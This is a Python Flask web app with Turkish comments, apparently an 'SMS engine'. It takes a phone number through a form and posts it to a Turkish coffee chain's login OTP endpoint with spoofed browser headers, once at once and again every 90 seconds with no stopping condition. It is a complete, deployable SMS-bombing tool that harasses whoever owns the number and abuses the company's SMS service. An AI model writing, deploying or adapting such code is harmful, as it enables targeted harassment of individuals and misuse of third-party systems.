import os
import time
import requests
from flask import Flask, render_template, request, jsonify
from flask_apscheduler import APScheduler

app = Flask(__name__)
scheduler = APScheduler()

# Render/Gunicorn Yapılandırması
class Config:
    SCHEDULER_API_ENABLED = True

app.config.from_object(Config())

# Aktif numaraları tutan liste
active_targets = {}

def send_kahve_dunyasi_sms(phone_number):
    """Gerçekten POST 200 gönderen ana fonksiyon"""
    url = "https://api.kahvedunyasi.com/v1/login/otp"
    
    payload = {
        "mobile_number": phone_number,
        "channel": "sms"
    }
    
    headers = {
        "Content-Type": "application/json",
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/121.0.0.0 Safari/537.36",
        "Origin": "https://www.kahvedunyasi.com",
        "Referer": "https://www.kahvedunyasi.com/"
    }

    try:
        # GERÇEK GÖNDERİM SATIRI (AKTİF)
        response = requests.post(url, json=payload, headers=headers, timeout=10)
        
        # Loglarda sonucu görmek için:
        print(f"[{time.ctime()}] Numara: {phone_number} | Durum: {response.status_code} | Yanıt: {response.text[:50]}")
        return response.status_code
    except Exception as e:
        print(f"[{time.ctime()}] Hata: {e}")
        return None

# Zamanlayıcı Görevi: Her 90 saniyede bir çalışır
@scheduler.task('interval', id='sms_job', seconds=90)
def scheduled_sms_job():
    if active_targets:
        print(f"--- Periyodik İşlem: {len(active_targets)} numara taranıyor ---")
        for phone_number in list(active_targets.keys()):
            send_kahve_dunyasi_sms(phone_number)

@app.route('/')
def index():
    return """
    <!DOCTYPE html>
    <html lang="tr">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>SMS Motoru v2 - 90s</title>
        <style>
            body { font-family: sans-serif; background: #121212; color: #eee; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
            .card { background: #1e1e1e; padding: 2rem; border-radius: 12px; box-shadow: 0 8px 32px rgba(0,0,0,0.5); width: 300px; text-align: center; border: 1px solid #333; }
            input { width: 100%; padding: 12px; margin: 1rem 0; background: #2b2b2b; border: 1px solid #444; color: #fff; border-radius: 6px; box-sizing: border-box; }
            button { width: 100%; padding: 12px; background: #ff9f43; border: none; color: #121212; font-weight: bold; cursor: pointer; border-radius: 6px; }
            #status { margin-top: 1rem; font-size: 0.9rem; color: #00d2d3; }
        </style>
    </head>
    <body>
        <div class="card">
            <h3>☕ SMS Motoru</h3>
            <p style="font-size: 0.8rem; color: #888;">90 saniye aralıkla gönderim yapar.</p>
            <input type="text" id="phone" placeholder="5XXXXXXXXX" maxlength="10">
            <button onclick="startMotor()">SİSTEMİ BAŞLAT</button>
            <div id="status"></div>
        </div>
        <script>
            function startMotor() {
                const phone = document.getElementById('phone').value;
                if(phone.length !== 10) { alert("Numarayı 10 hane olarak girin (5xx..)"); return; }
                
                document.getElementById('status').innerText = "İşlem başlatılıyor...";
                
                fetch('/start', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({phone: phone})
                })
                .then(res => res.json())
                .then(data => {
                    document.getElementById('status').innerText = data.message;
                })
                .catch(err => {
                    document.getElementById('status').innerText = "Hata oluştu!";
                });
            }
        </script>
    </body>
    </html>
    """

@app.route('/start', methods=['POST'])
def start():
    phone = request.json.get('phone')
    if phone:
        active_targets[phone] = time.time()
        # İlkini hemen gönder (200 kontrolü için)
        send_kahve_dunyasi_sms(phone)
        return jsonify({"message": f"{phone} listeye eklendi. Motor çalışıyor."})
    return jsonify({"message": "Numara geçersiz!"}), 400

# Gunicorn/Render için Scheduler başlatma
if not scheduler.running:
    scheduler.init_app(app)
    scheduler.start()

if __name__ == '__main__':
    # Render'ın verdiği PORT'u yakalar
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port)
